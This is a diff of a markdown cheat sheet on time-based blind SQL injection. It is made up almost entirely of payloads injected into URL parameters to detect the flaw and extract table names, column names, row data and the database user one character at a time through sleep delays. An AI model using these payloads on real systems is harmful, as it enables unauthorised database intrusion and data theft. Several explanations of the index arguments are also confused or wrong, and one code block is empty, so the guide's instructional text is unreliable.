@@ -30,41 +30,87 @@
   Example:
   ```http://domain.com/index.php?id=15'XOR(if(now()=sysdate(),sleep(5*5),0))OR'```  
   If the websites response is ~15 seconds, it means it is vulnerable to this kind of attack.
-  
-  ![ascii_table](https://www.asciitable.com/asciifull.gif)
    
-  **Retrieving name of all tables name**
+ 
+ ## Retrieving the tables  
   
   Find the first character of the first table:
   ```sql
-  and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
+  and if((select SUBSTRING(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
   ```
   
   Find the second character of the first table:
 ```sql
-and if((select substr(table_name,2,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
+and if((select SUBSTRING(table_name,2,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
 ```
 
   Find the third character of the first table:
 ```sql
-and if((select substr(table_name,3,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
+and if((select SUBSTRING(table_name,3,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
 ```
 
 Find the first character of the second table:
 ```sql
-and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
+and if((select SUBSTRING(table_name,1,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
 ```
 
 Find the second character of the second table:
 ```sql
-and if((select substr(table_name,2,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
+and if((select SUBSTRING(table_name,2,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
 ```
 
 So if you have realised by far, we are using this logic:
 limit **3**,1 -> the number of the table (targeting the third character)
 table_name,**3**,1 -> the number of the character in the table (targeting the fourth character of the table [the first character starts from 0, not 1])
-  
-  ***Alternative way of finding columns name by bruteforcing them***
-  
-  ```http://domain.com/index.php?id=1' SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--+```  
-  If the username **administrator** exists, you should except a response delay of 10 seconds, otherwise keep trying other methods.
+
+
+***Guess table names***  
+
+If you don't want to bruteforce character by character every possible table on the db, it is more efficient to bruteforce the names (if a table name is found, the request will be delayed for 5 seconds).
+Guess the name of the first table:  
+```sql
+and IF(SUBSTRING((select 1 from [guess_your_table_name] limit 0,1),1,1)=1,SLEEP(5),1)
+```
+
+
+## Retrieving the columns from a table
+
+A table has 1 or more columns. To dump the first character of the first table, use the following query:  
+```sql
+
+```
+
+***Guessing the columns***  
+(bruteforce [guess_your_column_name] with random column names untill the request is delayed by 5 seconds. Also replace [existing_table_name] with the table that you found from the previous step):  
+```sql
+pic_id=13 and IF(SUBSTRING((select substring(concat(1,[guess_your_column_name]),1,1) from [existing_table_name] limit 0,1),1,1)=1,SLEEP(5),1)-- -
+```
+
+## Retrieving the data from the columns  
+
+The following payload will search for the first character of the first column in the database. If the character is guessed, then it will sleep for 5 seconds (remember to replace **table_name** and **column_name** with the table and column that you found on the previous step):  
+
+```sql
+and if((select mid(column_name,1,1) from table_name limit 0,1)='a',sleep(5),1)--
+```
+
+To search for the first character of third column in the database, you should increase the number to 3:  
+```sql
+and if((select mid(column_name,3,1) from table_name limit 0,1)='a',sleep(5),1)--
+```
+
+To search for the third character of the first column, you should increate the first number after **table_name limit** to 2 (the first index is 0):  
+```sql
+and if((select mid(column_name,1,1) from table_name limit 2,1)='a',sleep(5),1)--
+```
+
+## Finding the db user
+Find the first character of the user (if guessed then the request will be 5 seconds delayed):
+```sql
+and if(substring(user(),1,1)='a',SLEEP(5),1)--
+```
+
+Find the second character of the user... and so on:
+```sql
+and if(substring(user(),2,1)='d',SLEEP(5),1)--
+```
